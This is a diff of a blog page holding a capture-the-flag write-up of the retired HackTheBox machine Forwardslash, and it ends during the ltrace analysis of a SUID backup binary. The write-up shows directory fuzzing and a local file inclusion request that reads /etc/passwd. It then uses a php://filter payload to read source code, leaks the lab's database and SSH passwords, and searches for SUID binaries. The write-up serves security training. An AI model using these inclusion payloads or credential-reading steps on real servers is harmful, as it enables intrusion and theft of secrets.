@@ -1,159 +1,115 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Forwardslash created by InfoSecJack and chivato publish on April 4, 2020. This box is classified as an hard machine. The user part inplies some enumeration a LFI, some PHP filter, a home made backup binary. The root part implies some home made crypto (don&#39;t) and a LUKS image." />
-<meta name="keywords" content="security, boot2root, HTB, openAdmin, Linux">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Forwardslash"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Forwardslash created by InfoSecJack and chivato publish on April 4, 2020. This box is classified as an hard machine. The user part inplies some enumeration a LFI, some PHP filter, a home made backup binary. The root part implies some home made crypto (don&#39;t) and a LUKS image."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/07/htb-forwardslash.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-07-07 09:09:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="openAdmin"/>
-  <meta property="article:tag" content="Linux"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Forwardslash</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Forwardslash created by InfoSecJack and chivato publish on April 4, 2020. This box is classified as an hard machine. The user part inplies some enumeration a LFI, some PHP filter, a home made backup binary. The root part implies some home made crypto (don't) and a LUKS image." name="description"/>
+<meta content="security, boot2root, HTB, openAdmin, Linux" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Forwardslash" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Forwardslash created by InfoSecJack and chivato publish on April 4, 2020. This box is classified as an hard machine. The user part inplies some enumeration a LFI, some PHP filter, a home made backup binary. The root part implies some home made crypto (don't) and a LUKS image." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/07/htb-forwardslash.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-07-07 09:09:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="openAdmin" property="article:tag"/>
+<meta content="Linux" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Forwardslash</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-forwardslash">HTB: Forwardslash</h1>
-    <p>
+<header>
+<h1 id="htb-forwardslash">HTB: Forwardslash</h1>
+<p>
       Posted on 07 Jul 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 9 min read
+        • 9 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.07/forwardslash_card.png" alt="Forwardslash card" width="262"></p>
+</header>
+<div>
+<p><img alt="Forwardslash card" class="align-left" src="/media/2020.07/forwardslash_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/239">Forwardslash</a> created by
 <a href="https://www.hackthebox.com/home/users/profile/52045">InfoSecJack</a> and
@@ -162,8 +118,6 @@ April 4, 2020.
 This box is classified as an hard machine. The user part inplies some
 enumeration a LFI, some PHP filter, a home made backup binary. The root part
 implies some home made crypto (<strong>don't</strong>) and a LUKS image.</p>
-
-
 <h1>User</h1>
 <h2>Recon</h2>
 <p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.</p>
@@ -177,16 +131,15 @@ PORT   STATE SERVICE
 
 # Nmap done at Sun Apr 25 07:56:20 2020 -- 1 IP address (1 host up) scanned in 12.27 seconds
 </code></pre></div>
-
 <h2>Web</h2>
 <p>The homepage announce that the site was hacked.</p>
-<p><img alt="homepage" src="/media/2020.07/forwardslash_01.png"></p>
+<p><img alt="homepage" class="image-process-article-image" src="/media/2020.07/derivatives/article-image/forwardslash_01.png"/></p>
 <p>We don't have access to anything. We start with a simple fuzzing using <code>ffuf</code>
 but nothing interesting came out. We had the extension <code>.xml</code>, <code>.txt</code> and <code>.php</code>
 to <code>ffuf</code> and relaunch it. This time we found an "interesting" page: <code>note.txt</code>.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://forwardslash.htb/FUZZ -mc 200 -c -e .xml,.txt,.php
 
-        /&#39;___\  /&#39;___\           /&#39;___\
+        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
@@ -210,7 +163,6 @@ index.php               [Status: 200, Size: 1695, Words: 207, Lines: 42]
 note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]
 :: Progress: [81876/81876] :: Job [1/1] :: 481 req/sec :: Duration: [0:02:50] :: Errors: 67 ::
 </code></pre></div>
-
 <p>The note contain a message from the website administrator <code>chiv</code> speaking about
 a backup site.</p>
 <blockquote>
@@ -219,7 +171,7 @@ a backup site.</p>
 </blockquote>
 <p>We modify our <code>/etc/hosts</code> in order to add the <code>backup</code> subdomain and browse to
 <code>http://backup.forwardslash.htb/</code> which is an authentication form.</p>
-<p><img alt="backup homepage" src="/media/2020.07/forwardslash_02.png"></p>
+<p><img alt="backup homepage" class="image-process-article-image" src="/media/2020.07/derivatives/article-image/forwardslash_02.png"/></p>
 <p>We are able to auto register here and access an few functionality. One was
 disabled because of the hack: The profile picture upload. But the button are just
 disables in the HTML source code. We can easily re-enable them with the element
@@ -236,7 +188,6 @@ Content-Length: 32
 
 url=../../../../../../etc/passwd
 </code></pre></div>
-
 <p>Here is the server's response:</p>
 <div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
 root:x:0:0:root:/root:/bin/bash
@@ -272,7 +223,6 @@ pain:x:1000:1000:pain:/home/pain:/bin/bash
 chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
 mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
 </code></pre></div>
-
 <p>Now that we have a LFI we can look for the database credentials. We load the
 <code>register.php</code> file as it is certainly using the database to store the new
 users. We see that the file only include the <code>config.php</code> file.</p>
@@ -285,21 +235,19 @@ Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq
 
 url=./register.php
 </code></pre></div>
-
 <p>Here is the server's answer:</p>
 <div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
 // Include config file
-require_once &quot;config.php&quot;;
+require_once "config.php";
 
 // Define variables and initialize with empty values
-$username = $password = $confirm_password = &quot;&quot;;
-$username_err = $password_err = $confirm_password_err = &quot;&quot;;
+$username = $password = $confirm_password = "";
+$username_err = $password_err = $confirm_password_err = "";
 
 // Processing form data when form is submitted
-if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){
+if($_SERVER["REQUEST_METHOD"] == "POST"){
 &lt;SNIP&gt;
 </code></pre></div>
-
 <p>Therefore we load the <code>config.php</code> file. It contains the current DB credentials
 but we cannot use them for anything else (mostly connect using the SSH service).
 The comment speaks about a backup of the old configuration.</p>
@@ -312,26 +260,24 @@ Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq
 
 url=./config.php
 </code></pre></div>
-
 <p>Here is the server's answer:</p>
-<div class="highlight"><pre><span></span><code>//credentials for the temp db while we recover, had to backup old config, didn&#39;t want it getting compromised -pain
-define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);
-define(&#39;DB_USERNAME&#39;, &#39;www-data&#39;);
-define(&#39;DB_PASSWORD&#39;, &#39;5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec&#39;);
-define(&#39;DB_NAME&#39;, &#39;site&#39;);
+<div class="highlight"><pre><span></span><code>//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'www-data');
+define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
+define('DB_NAME', 'site');
 
 /* Attempt to connect to MySQL database */
 $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
 // Check connection
 if($link === false){
-    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());
+    die("ERROR: Could not connect. " . mysqli_connect_error());
 }
 </code></pre></div>
-
 <p>We start enumeration the website and quickly found the <code>/dev/</code> folder. He is not
 accessible from our IP address as there must be some network filtering.</p>
-<p><img alt="dev access denied" src="/media/2020.07/forwardslash_03.png"></p>
+<p><img alt="dev access denied" class="image-process-article-image" src="/media/2020.07/derivatives/article-image/forwardslash_03.png"/></p>
 <p>We try to include the file with our previous LFI but we got an error saying "Permission Denied; not that way ;)"</p>
 <p>Here is the request:</p>
 <div class="highlight"><pre><span></span><code>POST /profilepicture.php HTTP/1.1
@@ -342,7 +288,6 @@ Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq
 
 url=dev/index.php
 </code></pre></div>
-
 <p>We then try to use the PHP filters to access the file content. The base64 filter
 give us the content of the file base64 encoded.</p>
 <p>Here is the request:</p>
@@ -354,34 +299,30 @@ Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq
 
 url=php://filter/convert.base64-encode/resource=dev/index.php
 </code></pre></div>
-
 <p>Here is the server's answer:</p>
 <div class="highlight"><pre><span></span><code>PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
 </code></pre></div>
-
 <p>We decode the base64 content to get the old database credentials.</p>
-<div class="highlight"><pre><span></span><code><span class="x">if (preg_match($reg, $_GET[&#39;xml&#39;], $match)) {</span>
-<span class="x">        $ip = explode(&#39;/&#39;, $match[0])[2];</span>
+<div class="highlight"><pre><span></span><code><span class="x">if (preg_match($reg, $_GET['xml'], $match)) {</span>
+<span class="x">        $ip = explode('/', $match[0])[2];</span>
 <span class="x">        echo $ip;</span>
-<span class="x">        error_log(&quot;Connecting&quot;);</span>
+<span class="x">        error_log("Connecting");</span>
 
-<span class="x">        $conn_id = ftp_connect($ip) or die(&quot;Couldn&#39;t connect to $ip\n&quot;);</span>
+<span class="x">        $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");</span>
 
-<span class="x">        error_log(&quot;Logging in&quot;);</span>
+<span class="x">        error_log("Logging in");</span>
 
-<span class="x">        if (@ftp_login($conn_id, &quot;chiv&quot;, &#39;N0bodyL1kesBack/&#39;)) {</span>
+<span class="x">        if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {</span>
 
-<span class="x">                error_log(&quot;Getting file&quot;);</span>
-<span class="x">                echo ftp_get_string($conn_id, &quot;debug.txt&quot;);</span>
+<span class="x">                error_log("Getting file");</span>
+<span class="x">                echo ftp_get_string($conn_id, "debug.txt");</span>
 </code></pre></div>
-
 <p>This credentials are also valid for the SSH service as <code>chiv</code>.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ ssh chiv@forwardslash.htb
-chiv@forwardslash.htb&#39;s password:
+chiv@forwardslash.htb's password:
 &lt;snip&gt;
 chiv@forwardslash:~$
 </code></pre></div>
-
 <p>There is no user.txt in <code>chiv</code>'s home folder. The other user is <code>pain</code> with the
 <code>uid</code> 1000. We start enumerating the box for a privilege escalation.</p>
 <p>We can list the file in the <code>pain</code> user homefolder. The <code>encryptorinator</code> and
@@ -390,7 +331,6 @@ to them later.</p>
 <div class="highlight"><pre><span></span><code>chiv@forwardslash:~$ ls ../pain/
 encryptorinator  note.txt  user.txt
 </code></pre></div>
-
 <p>When looking at <code>/var/backups/</code> we see a few interesting files, mainly the
 <code>config.php.bak</code> that is only readable by the <code>pain</code> user.</p>
 <div class="highlight"><pre><span></span><code>chiv@forwardslash:~$ ls /var/backups/ -l
@@ -413,20 +353,18 @@ total 996
 drwxrwx--- 2 root backupoperator   4096 May 27  2019 recovery
 -rw------- 1 root shadow           1174 Mar  6 14:21 shadow.bak
 </code></pre></div>
-
 <p>When looking for SUID binary we found that the binary <code>/usr/bin/backup</code> is SUID
 and belonging to the <code>pain</code> user.</p>
 <div class="highlight"><pre><span></span><code>chiv@forwardslash:/home/pain$ find / -uid 1000 -perm -4000 -type f 2&gt;/dev/null
 /usr/bin/backup
 </code></pre></div>
-
 <p>The binary is a standard linux program. When we run it, it told us that a file
 doesn't exist. The filename looks like a MD5 hash.</p>
 <div class="highlight"><pre><span></span><code>chiv@forwardslash:/home/pain$ file /usr/bin/backup
 /usr/bin/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=e0fcfb1c48fe0b5377774c1d237dc50ddfa41c08, not stripped
 chiv@forwardslash:/home/pain$ /usr/bin/backup
 ----------------------------------------------------------------------
-        Pain&#39;s Next-Gen Time Based Backup Viewer
+        Pain's Next-Gen Time Based Backup Viewer
         v0.1
         NOTE: not reading the right file yet,
         only works if backup is taken in same second
@@ -435,14 +373,13 @@ chiv@forwardslash:/home/pain$ /usr/bin/backup
 Current Time: 10:14:45
 ERROR: f057d631c54aae27e968bc3fafb02b4e Does Not Exist or Is Not Accessible By Me, Exiting...
 </code></pre></div>
-
 <p>We use <code>ltrace</code> to see what are the system call of the program and we see that
 the filename is a MD5 hash of the current time.</p>
 <div class="highlight"><pre><span></span><code>chiv@forwardslash:/home/pain$ ltrace /usr/bin/backup
 getuid()                                                                                                                                         = 1001
 getgid()                                                                                                                                         = 1001
-puts(&quot;--------------------------------&quot;...----------------------------------------------------------------------
-        Pain&#39;s Next-Gen Time Based Backup Viewer
+puts("--------------------------------"...----------------------------------------------------------------------
+        Pain's Next-Gen Time Based Backup Viewer
         v0.1
         NOTE: not reading the right file yet,
         only works if backup is taken in same second
@@ -452,53 +389,51 @@ puts(&quot;--------------------------------&quot;...----------------------------
 time(0)                                                                                                                                          = 1588846490
 localtime(0x7ffdb8c71790)                                                                                                                        = 0x7f373a3526a0
 malloc(13)                                                                                                                                       = 0x56277209e8e0
-sprintf(&quot;10:14:50&quot;, &quot;%02d:%02d:%02d&quot;, 10, 14, 50)                                                                                                = 8
-strlen(&quot;10:14:50&quot;)                                                                                                                               = 8
+sprintf("10:14:50", "%02d:%02d:%02d", 10, 14, 50)                                                                                                = 8
+strlen("10:14:50")                                                                                                                               = 8
 malloc(33)                                                                                                                                       = 0x56277209e900
 MD5_Init(0x7ffdb8c716e0, 4000, 0x56277209e900, 0x56277209e900)                                                                                   = 1
 MD5_Update(0x7ffdb8c716e0, 0x56277209e8e0, 8, 0x56277209e8e0)                                                                                    = 1
 MD5_Final(0x7ffdb8c71740, 0x7ffdb8c716e0, 0x7ffdb8c716e0, 0)                                                                                     = 1
-snprintf(&quot;9c&quot;, 32, &quot;%02x&quot;, 0x9c)                                                                                                                 = 2
-snprintf(&quot;71&quot;, 32, &quot;%02x&quot;, 0x71)                                                                                                                 = 2
-snprintf(&quot;36&quot;, 32, &quot;%02x&quot;, 0x36)                                                                                                                 = 2
-snprintf(&quot;55&quot;, 32, &quot;%02x&quot;, 0x55)                                                                                                                 = 2
-snprintf(&quot;35&quot;, 32, &quot;%02x&quot;, 0x35)                                                                                                                 = 2
-snprintf(&quot;e4&quot;, 32, &quot;%02x&quot;, 0xe4)                                                                                                                 = 2
-snprintf(&quot;4d&quot;, 32, &quot;%02x&quot;, 0x4d)                                                                                                                 = 2
-snprintf(&quot;c7&quot;, 32, &quot;%02x&quot;, 0xc7)                                                                                                                 = 2
-snprintf(&quot;6d&quot;, 32, &quot;%02x&quot;, 0x6d)                                                                                                                 = 2
-snprintf(&quot;65&quot;, 32, &quot;%02x&quot;, 0x65)                                                                                                                 = 2
-snprintf(&quot;bb&quot;, 32, &quot;%02x&quot;, 0xbb)                                                                                                                 = 2
-snprintf(&quot;cd&quot;, 32, &quot;%02x&quot;, 0xcd)                                                                                                                 = 2
-snprintf(&quot;1f&quot;, 32, &quot;%02x&quot;, 0x1f)                                                                                                                 = 2
-snprintf(&quot;aa&quot;, 32, &quot;%02x&quot;, 0xaa)                                                                                                                 = 2
-snprintf(&quot;ab&quot;, 32, &quot;%02x&quot;, 0xab)                                                                                                                 = 2
-snprintf(&quot;14&quot;, 32, &quot;%02x&quot;, 0x14)                                                                                                                 = 2
-printf(&quot;Current Time: %s\n&quot;, &quot;10:14:50&quot;Current Time: 10:14:50
+snprintf("9c", 32, "%02x", 0x9c)                                                                                                                 = 2
+snprintf("71", 32, "%02x", 0x71)                                                                                                                 = 2
+snprintf("36", 32, "%02x", 0x36)                                                                                                                 = 2
+snprintf("55", 32, "%02x", 0x55)                                                                                                                 = 2
+snprintf("35", 32, "%02x", 0x35)                                                                                                                 = 2
+snprintf("e4", 32, "%02x", 0xe4)                                                                                                                 = 2
+snprintf("4d", 32, "%02x", 0x4d)                                                                                                                 = 2
+snprintf("c7", 32, "%02x", 0xc7)                                                                                                                 = 2
+snprintf("6d", 32, "%02x", 0x6d)                                                                                                                 = 2
+snprintf("65", 32, "%02x", 0x65)                                                                                                                 = 2
+snprintf("bb", 32, "%02x", 0xbb)                                                                                                                 = 2
+snprintf("cd", 32, "%02x", 0xcd)                                                                                                                 = 2
+snprintf("1f", 32, "%02x", 0x1f)                                                                                                                 = 2
+snprintf("aa", 32, "%02x", 0xaa)                                                                                                                 = 2
+snprintf("ab", 32, "%02x", 0xab)                                                                                                                 = 2
+snprintf("14", 32, "%02x", 0x14)                                                                                                                 = 2
+printf("Current Time: %s\n", "10:14:50"Current Time: 10:14:50
 )                                                                                                         = 23
 setuid(1002)                                                                                                                                     = -1
 setgid(1002)                                                                                                                                     = -1
-access(&quot;9c71365535e44dc76d65bbcd1faaab14&quot;..., 0)                                                                                                 = -1
-printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;9c71365535e44dc76d65bbcd1faaab14&quot;...ERROR: 9c71365535e44dc76d65bbcd1faaab14 Does Not Exist or Is Not Accessible By Me, Exiting...
+access("9c71365535e44dc76d65bbcd1faaab14"..., 0)                                                                                                 = -1
+printf("ERROR: %s Does Not Exist or Is N"..., "9c71365535e44dc76d65bbcd1faaab14"...ERROR: 9c71365535e44dc76d65bbcd1faaab14 Does Not Exist or Is Not Accessible By Me, Exiting...
 )                                                             = 94
 setuid(1001)                                                                                                                                     = 0
 setgid(1001)                                                                                                                                     = 0
